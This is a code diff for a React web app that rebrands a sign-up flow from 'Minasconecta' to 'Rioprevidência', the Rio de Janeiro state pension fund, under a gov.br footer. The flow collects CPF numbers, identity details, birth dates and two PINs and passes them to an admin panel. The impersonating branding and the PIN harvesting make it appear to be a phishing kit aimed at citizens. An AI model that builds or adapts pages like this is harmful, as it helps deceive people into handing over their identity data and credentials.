@@ -52,8 +52,14 @@ async function createCadastro({ cpf, name, pin8, pin6 }) {
   return payload.data || {};
 }
 
+function BrandMark() {
+  return <svg className="brand-logo__mark" viewBox="0 0 96 96" aria-hidden="true" focusable="false"><rect className="brand-logo__badge" x="4" y="4" width="88" height="88" rx="22" /><path className="brand-logo__glyph" fill="currentColor" d="M48 76C39.4 68.3 23 55.5 23 40.6 23 31.5 30.2 25 38.3 25c4.4 0 8 2.2 9.7 5.7C49.7 27.2 53.3 25 57.7 25 65.8 25 73 31.5 73 40.6c0 14.9-16.4 27.7-25 35.4Z" /><circle className="brand-logo__dot" cx="35.5" cy="38" r="6.2" /><circle className="brand-logo__dot-inner" cx="35.5" cy="38" r="3.1" /></svg>;
+}
+function BrandLogo({ variant }) {
+  return <span className={variant === "inverse" ? "brand-logo brand-logo--inverse" : "brand-logo"}><BrandMark /><span className="brand-logo__text"><strong className="brand-logo__name">Rioprevidência</strong><small className="brand-logo__tag">Fundo Único de Previdência Social do Estado do Rio de Janeiro</small></span></span>;
+}
 function Header({ step }) {
-  return <header className="brand-area"><div className="brand-mark">Minasconecta</div><div className="progress" role="progressbar" aria-valuenow={step} aria-valuemin="1" aria-valuemax={TOTAL_STEPS}><div className="progress__track">{Array.from({ length: TOTAL_STEPS }, (_, index) => <span key={index} className={index < step ? "progress__segment is-active" : "progress__segment"} />)}</div><p>Etapa <strong>{step}</strong> de {TOTAL_STEPS}</p></div></header>;
+  return <header className="brand-area"><BrandLogo /><div className="progress" role="progressbar" aria-valuenow={step} aria-valuemin="1" aria-valuemax={TOTAL_STEPS}><div className="progress__track">{Array.from({ length: TOTAL_STEPS }, (_, index) => <span key={index} className={index < step ? "progress__segment is-active" : "progress__segment"} />)}</div><p>Etapa <strong>{step}</strong> de {TOTAL_STEPS}</p></div></header>;
 }
 function Footer() { return <footer className="footer-brand" aria-label="Governo Federal"><span className="gov-blue">gov</span><span className="gov-green">.</span><span className="gov-yellow">br</span></footer>; }
 
@@ -234,7 +240,7 @@ function AdminDashboard({ onLogout }) {
   return (
     <main className="admin-shell">
       <header className="admin-topbar">
-        <strong>Minasconecta</strong>
+        <BrandLogo variant="inverse" />
         <button type="button" onClick={onLogout}>Sair</button>
       </header>
       <div className="admin-content">
@@ -301,7 +307,7 @@ function AdminDashboard({ onLogout }) {
 
 export default function App() {
   const [route] = useState(window.location.pathname); const [step, setStep] = useState(1); const [cpf, setCpf] = useState(""); const [identity, setIdentity] = useState(null); const [pin8, setPin8] = useState(""); const [pin6, setPin6] = useState(""); const [protocol, setProtocol] = useState(""); const [adminLogged, setAdminLogged] = useState(hasAdminSession);
-  useEffect(() => { document.title = route.startsWith("/admin") ? "Minasconecta — Painel Administrativo" : "Minasconecta — Identidade digital segura"; }, [route]);
+  useEffect(() => { document.title = route.startsWith("/admin") ? "Rioprevidência — Painel Administrativo" : "Rioprevidência — Identidade digital segura"; }, [route]);
   if (route.startsWith("/admin")) { if (!adminLogged) return <AdminLogin onLogin={() => setAdminLogged(true)} />; return <AdminDashboard onLogout={() => { sessionStorage.removeItem(ADMIN_SESSION_KEY); setAdminLogged(false); }} />; }
   return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <StepPin onContinue={(value) => { setPin8(value); setStep(5); }} onBack={() => setStep(3)} />}{step === 5 && <StepPin6 previousPin={pin8} onContinue={(value) => { setPin6(value); setStep(6); }} onBack={() => setStep(4)} />}{step === 6 && <StepConfirmProtocol cpf={cpf} identity={identity} pin8={pin8} pin6={pin6} onContinue={(value) => { setProtocol(value); setStep(7); }} onBack={() => setStep(5)} />}{step === 7 && <StepProcessing protocol={protocol} />}</div><Footer /></div></main>;
 }
